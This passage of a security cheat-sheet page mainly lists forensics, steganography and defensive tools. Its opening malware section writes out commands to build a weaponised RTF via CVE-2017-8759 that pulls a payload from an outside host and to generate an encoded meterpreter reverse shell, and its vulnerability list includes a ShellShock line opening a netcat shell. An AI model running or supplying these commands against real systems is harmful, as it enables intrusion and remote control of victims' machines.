Trivial malware generation:

* `msf> search exploit/windows/fileformat/adobe_pdf_embedded_exe` - embed shellcode into pdf
* *CVE-2017-8759* - insert shellcode into *.rtf* (last time I tested it under windows 10 - it worked perfectly)
    
    <div class="spoiler"><div class="spoiler-title" markdown="1">
    *[PoC for infecting rtf (github poc)](https://github.com/bhdresh/CVE-2017-8759):*
    </div><div class="spoiler-text" markdown="1">
    * generate malicious RTF file `python cve-2017-8759_toolkit.py -M gen -w report-2017.rtf -u http://back-connect.com/logo.txt`
    * (Optional, if using MSF Payload) : Generate metasploit payload and start handler: `msfvenom -p windows/meterpreter/reverse_https LHOST=195.16.61.232 LPORT=443 -f exe -a x86 --platform windows -b "\x00\x0a\x0d" -i 15 -e x86/shikata_ga_nai > /tmp/meter-reverse-https.exe`
    * Start toolkit in exploit mode to deliver local payload: `python cve-2017-8759_toolkit.py -M exp -e http://back-connect.com/logo.txt -l /tmp/meter-reverse-https.exe`
    </div></div>

<br>

## Unclassified tools/links/...

* [pentest scripts](https://github.com/milo2012/pentest_scripts)
* [51x guy's repository](https://github.com/51x/) has many wonderfull things

[non-alphanumeric bash script](https://losfuzzys.github.io/writeup/2017/12/30/34c3ctf-minbashmaxfun/)

<br>

---

# Forensic (images, raw data, broken data) (more about ctf, rather than real insident response)

#### articles:

* [forensicswiki.org](http://forensicswiki.org/wiki/Main_Page) - awesomeness, web-site about forensic
    <br> [Document Metadata Extraction](http://www.forensicswiki.org/wiki/Document_Metadata_Extraction)

#### tools for analyzing, reverse engineering, and extracting images/files:

* [WinHex](https://www.x-ways.net/winhex/) - a universal hexadecimal editor, particularly helpful in the realm of computer forensics, data recovery, low-level data processing, and IT security
* *Determine type of data*:

    * ***file*** (linux), [trid (windows)](http://mark0.net/soft-trid-e.html) - identify file types from their binary signatures
    * [File Format Identification](http://www.forensicswiki.org/wiki/File_Format_Identification)
    * [toolsley.com (online tool)](https://www.toolsley.com/file.html)
    * [***Tika*** (apache's)](http://tika.apache.org/) - a content analysis toolkit

* [***hash-identifier***](https://tools.kali.org/password-attacks/hash-identifier) (kali tool)
* *Analyse raw-data*:

    * [Autopsy](https://github.com/sleuthkit/autopsy) – easy to use GUI digital forensics platform (can recover data, ...)
        <br> &emsp; ([The Sleuth Kit](https://www.sleuthkit.org/sleuthkit/) - library, used by autopsy behind the curtains)
    * [volatility](http://www.volatilityfoundation.org/releases) ([volatility (github)](https://github.com/volatilityfoundation/volatility/wiki)) - advanced memory forensics framework

    * *Extract files/info from raw-data*:

        * ***binwalk*** (`-E` flag will show entropy value)
        * [extract-firmware.sh](https://github.com/mirror/firmware-mod-kit/blob/master/extract-firmware.sh)
        * [bulk-extractor](http://www.forensicswiki.org/wiki/Bulk_extractor) - extracts useful information by processing partially corrupted or compressed data (zip, pdf, gzip, ...). It can carve JPEGs, office documents and other kinds of files out of fragments of compressed data. It will detect and carve encrypted RAR files.
            <br> `bulk_extractor -o bulk-out xp-laptop-2005-07-04-1430.img` - extract files to the output directory (-o bulk-out) after analyzing the image file (xp-laptop-2005-07-04-1430.img)

    * *Restore*:

        * ***foremost*** - recover files using their headers, footers, and data structures
        * [DiskDrill](https://www.cleverfiles.com/help/) - data recovery for MacOS and Windows


* [FTK (Forensic toolkit)](http://accessdata.com/product-download/ftk-download-page)
* [FTK Imager](http://marketing.accessdata.com/ftkimager3.2.0)

<br>

#### ctf forensics / steganography

##### Audio:

* [Audacity](http://www.audacityteam.org/download/) – cross-platform audio software for multi-track recording and editing
* [mp3stego](http://www.caesum.com/handbook/stego.htm)
* [SonicVisualiser](http://www.sonicvisualiser.org/download.html) - audio forensics
* ***ffmpeg*** – video converter

##### Pictures, images:

*   [stegsolve](http://www.caesum.com/handbook/stego.htm)
*   [PIL](http://www.pythonware.com/products/pil/) - python imaging library

    <div class="spoiler"><div class="spoiler-title">
    <i>PIL example:</i>
    </div><div class="spoiler-text" markdown="1">
    
    ``` python
    import Image

    img = Image.open('image.png')
    in_pixels = list(img.getdata())
    out_pixels = list()

    for i in range(len(in_pixels)):
        r = in_pixels[i][0]
        g = in_pixels[i][1]
        b = in_pixels[i][2]
        out_pixels.append( (r^g^b, 0, 0) )

    out_img = Image.new(img.mode, img.size)
    out_img.putdata(out_pixels)
    out_img.show()
    ```
    </div>
    </div>

* [pngcheck](http://www.libpng.org/pub/png/apps/pngcheck.html) (linux) – verifies the integrity of PNG, JNG and MNG files and extracts format chuncks
* [ImageMagick](https://www.imagemagick.org/script/download.php) (linux) - create, edit, compose, or convert bitmap images

* **articles**:

    * [cheatsheet - Steganography 101](https://pequalsnp-team.github.io/cheatsheet/steganography-101)
    * [Pic_stego](http://itsecwiki.org/index.php?title=Pic_stego)

##### steganography:

* ***exiftool(–k)*** - read and write meta information in files
* ***outguess***, ***stegdetect***, [***steghide***](http://steghide.sourceforge.net/) – stegano detectors
    <br> `steghide embed -cf picture.jpg -ef secret.txt`
    <br> `steghide extract -sf picture.jpg`

<br>

---

# Defensive

[GOSINT](https://github.com/ciscocsirt/GOSINT) - Open Source Threat Intelligence Gathering and Processing Framework

[Rootkit hunter](http://rkhunter.sourceforge.net/) - security monitoring and analyzing tool for POSIX compliant systems

[Securing Java](http://www.securingjava.com/toc.html) ([web archive - securing java](https://web.archive.org/web/20170809210051/http://www.securingjava.com/toc.html))

Obfuscation:

* [tigress](http://tigress.cs.arizona.edu/) – Tigress is a diversifying virtualizer/obfuscator for the C language that supports many novel defenses against both static and dynamic reverse engineering and de-virtualization attacks
* [sendmark](http://sandmark.cs.arizona.edu/) – tool for software watermarking, tamper-proofing, and code obfuscation of Java bytecode
* [snort](https://www.snort.org/) – network intrusion prevention system (NIPS) and network intrusion detection system (NIDS) (free and opensource)

* {:.dummy} *Revelo* – obfuscate/deobfuscate JS-code.
* {:.dummy} *PHPConverter* – obfuscate/deobfuscate PHP-code
* {:.dummy} *PHPScriptDecoder* – deobfuscator of PHP-code

Honeypots:

* [kippo](https://github.com/desaster/kippo) - ssh honeypot
* `python -m smtpd -n -c DebuggingServer localhost:25` - smtp honeypot
* `ssh whoami.filippo.io` - ssh deanonymization

<br>


**Rolebased and mandatory access models** for Linux: ***SELinux***, ***GRSecurity***, ***AppArmor***, ...
<br> SELinux (triplet is called - *security context*):

* (subject) username -> (exists policy setting available role changes) -> role -> (role linked to several domains) -> domain/type (set of actions available to process)
* (objects) name -> role -> type
    <br> &nbsp;

* polices contains rules, how types can access each other, whether it be a domain accessing a type, or a domain accessing another domain
* *Access vector* for *class* - describes set of operations available to be done by subject under object whose type belongs to defined class (classes inheritance is available)
* *type transitions* - types can automatically change with `exec`

<br>


[molo.ch](https://molo.ch/) [molo.ch (github)](https://github.com/aol/moloch) - open source, large scale, full packet capturing, indexing, and database system

<!-- 
## Network

uRPF - Unicast Reverse Path Forwarding
-->

<br>

---

## Widely heard vulnerabilities

* [DirtyCow](http://dirtycow.ninja/) (CVE-2016-5195)
    <br> `searchsploit 'dirty cow'` `gcc /path/to/exploit.c -o cowroot -pthread`
* [Heartbleed](http://heartbleed.com/) (*CVE-2014-0160*) - vulnerability in OpenSSL library (heartbeat sub-protocol)
    <br> [msf module: `use auxiliary/scanner/ssl/openssl_heartbleed`](https://community.rapid7.com/community/metasploit/blog/2014/04/09/metasploits-heartbleed-scanner-module-cve-2014-0160)
* ***ShellShock / BashDoor*** (CVE-2014-6271, ...)
    <br> exploit example: `curl -A '() { :; }; /bin/nc -p 3333 -e /bin/sh' http://10.0.0.1/script`
    <br> check your system: `export evil='() { :;}; echo vulnerable'; bash -c echo;`
    <br> check cgi script: `curl -i -X HEAD "http://example.com/" -A '() { :; }; echo "Warning: Server Vulnerable"'`
* ***EternalBlue*** (CVE-2017-0144) (MS17-010) - vulnerability in SMB share (maybe microsoft's backdoor) (this vulnerability used in WannaCry)
* [KRACK attack](https://www.krackattacks.com/) - breaking WPA2 (CVE-2017-13077 - CVE-2017-13082, CVE-2017-13084, CVE-2017-13086 - CVE-2017-13088)
* [Meltdown / SPECTRE attack](https://spectreattack.com/) - intel's hardware vulnerability (CVE-2017-5715, CVE-2017-5753, CVE-2017-5754)

<br>

---

# Some tools

***selenium***, ***slimerjs***, ***phantomjs***, ***casperjs*** - software-testing framework for web applications - tools for browser-control

***BusyBox*** –  software that provides several stripped-down Unix tools in a single executable file

[TCC](https://bellard.org/tcc/) - tiny C compiler

Fun:

* [pingfs](https://github.com/yarrick/pingfs) - stores your data in ICMP ping packets
* [zcash](https://z.cash/about.html) - team trying to implement "Zerocash" protocol, based on Bitcoin's code, it intends to offer a far higher standard of privacy through a sophisticated zero-knowledge proving scheme that preserves confidentiality of transaction metadata.
    <br> serious project, in progress

</article>
